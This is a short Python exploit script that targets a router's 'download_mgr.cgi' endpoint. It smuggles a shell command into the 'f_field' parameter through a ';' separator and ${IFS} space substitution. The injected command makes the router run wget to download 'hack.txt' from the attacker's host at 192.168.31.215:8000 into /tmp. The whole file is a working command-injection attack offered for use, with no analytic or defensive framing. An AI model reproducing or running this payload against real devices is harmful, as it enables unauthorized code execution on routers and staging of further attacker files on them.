import requests
import sys

ROUTER_IP = "192.168.31.10"
MY_IP = "192.168.31.215"
MY_PORT = "8000"
FILE_NAME = "hack.txt"

def run_exploit():
    target_url = f"http://{ROUTER_IP}:80/cgi-bin/download_mgr.cgi"
    
    wget_cmd = f"wget${{IFS}}http://{MY_IP}:{MY_PORT}/{FILE_NAME}${{IFS}}-O${{IFS}}/tmp/{FILE_NAME}"
    final_payload = f"1;{wget_cmd};#"
    
    params = {
        'cmd': 'RSS_Update',
        'f_field': final_payload
    }
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload: {final_payload}")

    requests.get(target_url, params=params, timeout=5)
    print("[+] Exploit sent successfully!")


if __name__ == "__main__":
    run_exploit()
